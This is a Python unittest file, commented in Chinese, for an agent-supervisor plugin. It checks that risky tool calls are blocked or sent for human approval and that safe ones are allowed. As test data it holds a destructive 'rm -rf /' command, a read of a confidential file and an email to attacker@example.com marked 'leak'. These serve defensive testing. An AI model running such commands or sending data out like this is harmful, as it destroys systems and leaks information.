"""V1-02 OpenClaw 插件强制阻断测试。

验收对应 .trae/workflow/00_需求/验收标准.md 的 V1-02-01 ~ V1-02-06：
- 拒绝决策：工具 100% 不执行（block:true）
- 隔离决策：工具 100% 不执行（block:true，F1 强制阻断改造核心）
- 询问决策：暂停等待人工（requireApproval）
- 允许决策：正常执行（undefined）
"""

from __future__ import annotations

import unittest

from apps.api.agent_supervisor.adapters.integrations.openclaw_plugin_package import (
    build_openclaw_plugin_package_files,
    build_openclaw_plugin_package_summary,
)
from apps.api.agent_supervisor.domains.governance.supervisor import decide


class OpenClawPluginEnforceBlockTests(unittest.TestCase):
    """验证 OpenClaw 插件模板生成的 JS 代码对4类决策的强制阻断行为。"""

    runtime: str
    source: str

    @classmethod
    def setUpClass(cls) -> None:
        files = build_openclaw_plugin_package_files()
        cls.runtime = files["dist/index.js"]
        cls.source = files["src/index.ts"]

    def test_deny_decision_returns_block(self) -> None:
        """TC-V1-02-01: 拒绝决策必须返回 block:true，工具不执行。"""
        self.assertIn('decision === "拒绝"', self.runtime)
        self.assertIn("block: true", self.runtime)
        deny_branch = self.runtime.split('decision === "拒绝" || decision === "隔离"')[1]
        block_part = deny_branch.split("return {")[1]
        self.assertIn("block: true", block_part)

    def test_quarantine_decision_returns_block(self) -> None:
        """TC-V1-02-02: 隔离决策必须返回 block:true，工具 100% 不执行（F1 改造核心）。"""
        self.assertIn(
            'decision === "拒绝" || decision === "隔离"',
            self.runtime,
            "隔离决策必须与拒绝决策走同一个 block 分支，实现强制阻断",
        )
        self.assertNotIn(
            'decision === "隔离" ? "隔离执行高风险工具"',
            self.runtime,
            "隔离决策不应再走 requireApproval 人工审批分支",
        )

    def test_ask_decision_returns_require_approval(self) -> None:
        """TC-V1-02-03: 询问决策返回 requireApproval，暂停等待人工。"""
        self.assertIn("requireApproval", self.runtime)
        self.assertIn('timeoutBehavior: "deny"', self.runtime)

    def test_allow_decision_returns_undefined(self) -> None:
        """TC-V1-02-04: 允许决策返回 undefined，放行工具调用。"""
        self.assertIn('decision === "允许"', self.runtime)
        allow_branch = self.runtime.split('decision === "允许"')[1]
        self.assertIn("return undefined", allow_branch[:80])

    def test_decision_mapping_summary_is_correct(self) -> None:
        """TC-V1-02-05: 验证插件包摘要的 decision_mapping 与实际行为一致。"""
        summary = build_openclaw_plugin_package_summary()
        mapping = summary["decision_mapping"]
        self.assertIn("强制阻断", mapping["拒绝"])
        self.assertIn("强制阻断", mapping["隔离"])
        self.assertIn("等待人工确认", mapping["询问"])
        self.assertIn("放行", mapping["允许"])

    def test_no_quarantine_require_approval_branch(self) -> None:
        """TC-V1-02-06: 隔离决策不再映射为 requireApproval，回归测试。"""
        quarantine_branch_pattern = 'decision === "隔离" ? "隔离执行高风险工具"'
        self.assertNotIn(
            quarantine_branch_pattern,
            self.runtime,
            "隔离决策必须从 requireApproval 分支移除，确保 100% 强制阻断",
        )


class SupervisorDecisionForOpenClawTests(unittest.TestCase):
    """验证 supervisor.decide() 对应4类 OpenClaw 测试场景返回正确决策。

    保证从监督器到 OpenClaw 插件模板的整条链路语义一致。
    """

    def test_sensitive_file_read_is_denied(self) -> None:
        """TC-V1-02-01 场景: file.read + 敏感文件 → 拒绝。"""
        tool_call = {
            "tool": "file.read",
            "arguments": {"path": "confidential/competition-teams.csv"},
        }
        decision = decide(tool_call, guard_enabled=True)
        self.assertEqual(decision.decision, "拒绝")
        self.assertEqual(decision.policy_id, "path-boundary")

    def test_dangerous_command_is_denied(self) -> None:
        """TC-V1-02-02 场景: code.run + 危险命令 → 拒绝。"""
        tool_call = {
            "tool": "code.run",
            "arguments": {"command": "rm -rf /"},
        }
        decision = decide(tool_call, guard_enabled=True)
        self.assertEqual(decision.decision, "拒绝")
        self.assertEqual(decision.policy_id, "dangerous-command")

    def test_external_mail_is_asked(self) -> None:
        """TC-V1-02-03 场景: mail.send + 外部邮箱 → 询问。"""
        tool_call = {
            "tool": "mail.send",
            "arguments": {"to": "attacker@example.com", "subject": "leak", "body": "data"},
        }
        decision = decide(tool_call, guard_enabled=True)
        self.assertEqual(decision.decision, "询问")
        self.assertEqual(decision.policy_id, "external-mail")

    def test_normal_file_read_is_allowed(self) -> None:
        """TC-V1-02-04 场景: file.read + 正常文件 → 允许。"""
        tool_call = {
            "tool": "file.read",
            "arguments": {"path": "public/readme.md"},
        }
        decision = decide(tool_call, guard_enabled=True)
        self.assertEqual(decision.decision, "允许")


if __name__ == "__main__":
    unittest.main()
